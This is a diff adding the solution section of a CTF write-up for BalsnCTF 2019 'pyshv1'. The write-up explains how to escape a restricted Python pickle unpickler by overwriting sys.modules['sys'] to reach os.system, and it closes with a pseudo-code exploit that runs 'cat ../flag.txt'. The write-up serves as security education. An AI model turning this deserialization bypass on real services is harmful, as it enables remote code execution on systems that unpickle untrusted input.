@@ -1088,7 +1088,76 @@ I realized that it&apos;s RIDICULOUSLY POWERFUL.</p>
 <p>It shouldn&apos;t be limited to some noob <code>__reduce__</code> RCE.</p>
 <p>Make pickle-pwn great again.</p>
 <h1 id="solution">Solution</h1>
-<p>Will be released 72 hours after the end of competition.</p>
+<h2 id="behavior">Behavior</h2>
+<p>In this task, we can send a pickle file to the server.</p>
+<pre class="language-"><code class="lang-python"><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    user <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">&apos;ascii&apos;</span><span class="token punctuation">)</span>
+    user <span class="token operator">=</span> codecs<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>user<span class="token punctuation">,</span> <span class="token string">&apos;base64&apos;</span><span class="token punctuation">)</span>
+    user <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>user<span class="token punctuation">)</span>
+</code></pre>
+<p>The packages that can be imported is limited to <code>sys</code> only.
+Also, deep import features starting from python3 is blocked.</p>
+<pre class="language-"><code class="lang-python"><span class="token comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span>
+<span class="token keyword">class</span> <span class="token class-name">RestrictedUnpickler</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>Unpickler<span class="token punctuation">)</span><span class="token punctuation">:</span>
+
+    <span class="token keyword">def</span> <span class="token function">find_class</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> module <span class="token keyword">not</span> <span class="token keyword">in</span> whitelist <span class="token keyword">or</span> <span class="token string">&apos;.&apos;</span> <span class="token keyword">in</span> name<span class="token punctuation">:</span>
+            <span class="token keyword">raise</span> KeyError<span class="token punctuation">(</span><span class="token string">&apos;The pickle is spoilt :(&apos;</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> pickle<span class="token punctuation">.</span>Unpickler<span class="token punctuation">.</span>find_class<span class="token punctuation">(</span>self<span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span>
+
+<span class="token comment"># ...</span>
+
+pickle<span class="token punctuation">.</span>whitelist<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">&apos;sys&apos;</span><span class="token punctuation">)</span>
+</code></pre>
+<h2 id="pickle">Pickle</h2>
+<p>Pickle is a stack-based VM that is aiming for construct structure.
+It has many data manipulation operations.
+The only disadvantage is that there&apos;s no read operations because you should already know what you constructed.</p>
+<p>You can find the pure python implementation of pickle from 
+<a href="https://github.com/python/cpython/blob/3.6/Lib/pickle.py" target="_blank">github</a> 
+or <code>/usr/lib/python3.6/pickle.py</code>.</p>
+<p>Let&apos;s see some operations will need in this task.</p>
+<pre class="language-"><code># Import root level attribute
+GLOBAL         = b&apos;c&apos;   # push self.find_class(modname, name); 2 string args
+
+# Call function
+REDUCE         = b&apos;R&apos;   # apply callable to argtuple, both on stack
+
+# Set attribute for class
+BUILD          = b&apos;b&apos;   # call __setstate__ or __dict__.update()
+
+# Set item in dict
+SETITEM        = b&apos;s&apos;   # add key+value pair to dict
+</code></pre><p><code>GLOBAL</code> (with our own filter) can only import attribute in root level, that is, importing <code>a.b</code> is OK, but importing <code>a.b.c</code> is disallowed.</p>
+<h2 id="sys-module">sys module</h2>
+<p><code>sys</code> has many interesting things inside. One of them is <code>sys.modules</code>, which is a cache of imported modules.</p>
+<p>Pickle also use <code>sys.modules</code>: </p>
+<pre class="language-"><code>def find_class(self, module, name):
+    # Subclasses may override this.
+    if self.proto &lt; 3 and self.fix_imports:
+        # ...
+        pass
+
+    __import__(module, level=0)
+
+    # ...
+
+    return getattr(sys.modules[module], name)
+</code></pre><p>If we change <code>sys.modules[&apos;sys&apos;]</code> to other things, we can get some attribute of it!!</p>
+<p>My exploit looks like:</p>
+<pre class="language-"><code class="lang-python">sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">&apos;sys&apos;</span><span class="token punctuation">]</span> <span class="token operator">=</span> sys<span class="token punctuation">.</span>modules
+
+<span class="token keyword">import</span> sys<span class="token punctuation">.</span>get <span class="token keyword">as</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>get
+
+os <span class="token operator">=</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&apos;os&apos;</span><span class="token punctuation">)</span>
+
+sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">&apos;sys&apos;</span><span class="token punctuation">]</span> <span class="token operator">=</span> os
+
+<span class="token keyword">import</span> sys<span class="token punctuation">.</span>system <span class="token keyword">as</span> os<span class="token punctuation">.</span>system
+
+os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">&apos;cat ../flag.txt&apos;</span><span class="token punctuation">)</span>
+</code></pre>
+<p>You can find the final pickle bytecode <a href="https://github.com/sasdf/ctf/blob/master/tasks/2019/BalsnCTF/misc/pyshv1/_files/solution/solve.py" target="_blank">here</a>.</p>
 
                                 
                                 </section>
@@ -1132,7 +1201,7 @@ I realized that it&apos;s RIDICULOUSLY POWERFUL.</p>
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"name":"pyshv1","category":"misc","points":572,"solves":13,"title":"misc - pyshv1","level":"7.1.6","depth":2,"next":{"title":"misc - pyshv2","level":"7.1.7","depth":2,"path":"tasks/2019/BalsnCTF/misc/pyshv2/README.md","ref":"tasks/2019/BalsnCTF/misc/pyshv2/README.md","articles":[]},"previous":{"title":"crypwn - securenote","level":"7.1.5","depth":2,"path":"tasks/2019/BalsnCTF/pwn/securenote/README.md","ref":"tasks/2019/BalsnCTF/pwn/securenote/README.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["katex@git://github.com/sasdf/plugin-katex.git","disqus","prism","-highlight","html-minifier","writeup-utils@git://github.com/sasdf/gitbook-plugin-writeup-utils.git"],"pluginsConfig":{"prism":{"css":["prismjs/themes/prism-tomorrow.css"],"lang":{"C":"c","C++":"cpp","asm":"nasm"}},"disqus":{"useIdentifier":false,"shortName":"sasdfwriteup"},"search":{},"html-minifier":{"customAttrSurround":[],"removeScriptTypeAttributes":false,"removeEmptyAttributes":false,"removeRedundantAttributes":false,"removeEmptyElements":false,"sortClassName":true,"caseSensitive":true,"html5":true,"collapseWhitespace":true,"processConditionalComments":false,"quoteCharacter":null,"keepClosingSlash":true,"preventAttributesEscaping":false,"minifyURLs":false,"removeAttributeQuotes":false,"decodeEntities":false,"trimCustomFragments":false,"customAttrAssign":[],"includeAutoGeneratedTags":true,"collapseInlineTagWhitespace":false,"collapseBooleanAttributes":true,"minifyJS":true,"removeTagWhitespace":true,"preserveLineBreaks":false,"sortAttributes":true,"removeStyleLinkTypeAttributes":false,"removeComments":true,"minifyCSS":true,"processScripts":[],"conservativeCollapse":false,"removeOptionalTags":false,"useShortDoctype":false},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"katex":{},"fontsettings":{"theme":"white","family":"sans","size":2},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"writeup-utils":{"filePrefix":"https://github.com/sasdf/ctf/blob/master","repoPrefix":"https://github.com/sasdf/ctf/blob/master","rawPrefix":"https://raw.githubusercontent.com/sasdf/ctf/master"}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"tasks/2019/BalsnCTF/misc/pyshv1/README.md","mtime":"2019-10-08T10:40:30.969Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-10-08T16:03:03.756Z"},"basePath":"../../../../..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"name":"pyshv1","category":"misc","points":572,"solves":13,"title":"misc - pyshv1","level":"7.1.6","depth":2,"next":{"title":"misc - pyshv2","level":"7.1.7","depth":2,"path":"tasks/2019/BalsnCTF/misc/pyshv2/README.md","ref":"tasks/2019/BalsnCTF/misc/pyshv2/README.md","articles":[]},"previous":{"title":"crypwn - securenote","level":"7.1.5","depth":2,"path":"tasks/2019/BalsnCTF/pwn/securenote/README.md","ref":"tasks/2019/BalsnCTF/pwn/securenote/README.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["katex@git://github.com/sasdf/plugin-katex.git","disqus","prism","-highlight","html-minifier","writeup-utils@git://github.com/sasdf/gitbook-plugin-writeup-utils.git"],"pluginsConfig":{"prism":{"css":["prismjs/themes/prism-tomorrow.css"],"lang":{"C":"c","C++":"cpp","asm":"nasm"}},"disqus":{"useIdentifier":false,"shortName":"sasdfwriteup"},"search":{},"html-minifier":{"customAttrSurround":[],"removeScriptTypeAttributes":false,"removeEmptyAttributes":false,"removeRedundantAttributes":false,"removeEmptyElements":false,"sortClassName":true,"caseSensitive":true,"html5":true,"collapseWhitespace":true,"processConditionalComments":false,"quoteCharacter":null,"keepClosingSlash":true,"preventAttributesEscaping":false,"minifyURLs":false,"removeAttributeQuotes":false,"decodeEntities":false,"trimCustomFragments":false,"customAttrAssign":[],"includeAutoGeneratedTags":true,"collapseInlineTagWhitespace":false,"collapseBooleanAttributes":true,"minifyJS":true,"removeTagWhitespace":true,"preserveLineBreaks":false,"sortAttributes":true,"removeStyleLinkTypeAttributes":false,"removeComments":true,"minifyCSS":true,"processScripts":[],"conservativeCollapse":false,"removeOptionalTags":false,"useShortDoctype":false},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"katex":{},"fontsettings":{"theme":"white","family":"sans","size":2},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"writeup-utils":{"filePrefix":"https://github.com/sasdf/ctf/blob/master","repoPrefix":"https://github.com/sasdf/ctf/blob/master","rawPrefix":"https://raw.githubusercontent.com/sasdf/ctf/master"}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"tasks/2019/BalsnCTF/misc/pyshv1/README.md","mtime":"2019-10-10T15:40:33.340Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-10-10T16:27:23.382Z"},"basePath":"../../../../..","book":{"language":""}});
         });
     </script>
 </div>
